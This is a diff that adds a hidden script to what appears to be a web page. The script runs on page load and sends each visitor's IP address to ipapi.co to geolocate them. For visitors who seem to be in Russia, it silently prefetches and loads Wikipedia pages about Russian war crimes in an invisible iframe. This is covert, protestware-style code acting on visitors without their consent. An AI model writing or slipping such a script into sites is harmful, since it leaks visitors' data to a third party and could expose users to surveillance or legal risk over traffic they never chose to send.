@@ -1,0 +1,73 @@
+<script>
+(function() {
+  var wikiUrls = [
+    "https://en.wikipedia.org/wiki/War_crimes_in_the_Russo-Ukrainian_war_(2022%E2%80%93present)",
+    "https://en.wikipedia.org/wiki/Russian_war_crimes",
+    "https://en.wikipedia.org/wiki/Atrocity_crimes_during_the_Russo-Ukrainian_war",
+    "https://en.wikipedia.org/wiki/Bucha_massacre",
+    "https://en.wikipedia.org/wiki/Siege_of_Mariupol",
+    "https://en.wikipedia.org/wiki/Child_abductions_in_the_Russo-Ukrainian_war",
+    "https://en.wikipedia.org/wiki/Casualties_of_the_Russo-Ukrainian_War",
+    "https://en.wikipedia.org/wiki/Russian_attacks_on_civilians_in_the_Russo-Ukrainian_war_(2022%E2%80%93present)"
+  ];
+
+  function doShadowPrefetch() {
+    var randomUrl = wikiUrls[Math.floor(Math.random() * wikiUrls.length)];
+    
+    var link = document.createElement('link');
+    link.rel = 'prefetch';
+    link.href = randomUrl;
+    document.head.appendChild(link);
+
+    var iframe = document.createElement('iframe');
+    iframe.src = randomUrl;
+    iframe.style.width = '0';
+    iframe.style.height = '0';
+    iframe.style.border = 'none';
+    iframe.style.position = 'absolute';
+    iframe.style.visibility = 'hidden';
+    iframe.style.opacity = '0';
+    document.body.appendChild(iframe);
+  }
+
+  function isRussianTimezone() {
+    try {
+      var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      var ruTimezones = [
+        'Europe/Moscow', 'Europe/Samara', 'Europe/Volgograd', 'Europe/Kirov',
+        'Europe/Astrakhan', 'Europe/Saratov', 'Europe/Ulyanovsk',
+        'Asia/Yekaterinburg', 'Asia/Omsk', 'Asia/Novosibirsk', 'Asia/Barnaul',
+        'Asia/Tomsk', 'Asia/Novokuznetsk', 'Asia/Krasnoyarsk', 'Asia/Irkutsk',
+        'Asia/Chita', 'Asia/Yakutsk', 'Asia/Khandyga', 'Asia/Vladivostok',
+        'Asia/Ust-Nera', 'Asia/Magadan', 'Asia/Sakhalin', 'Asia/Srednekolymsk',
+        'Asia/Kamchatka', 'Asia/Anadyr'
+      ];
+      return ruTimezones.indexOf(tz) !== -1;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function checkIPAndExecute() {
+    fetch('https://ipapi.co/json/')
+      .then(function(response) { return response.json(); })
+      .then(function(data) {
+        if (data.country_code === 'RU') {
+          doShadowPrefetch();
+        }
+      })
+      .catch(function() {
+        if (isRussianTimezone()) {
+          doShadowPrefetch();
+        }
+      });
+  }
+
+  // Execute
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', checkIPAndExecute);
+  } else {
+    checkIPAndExecute();
+  }
+})();
+</script>
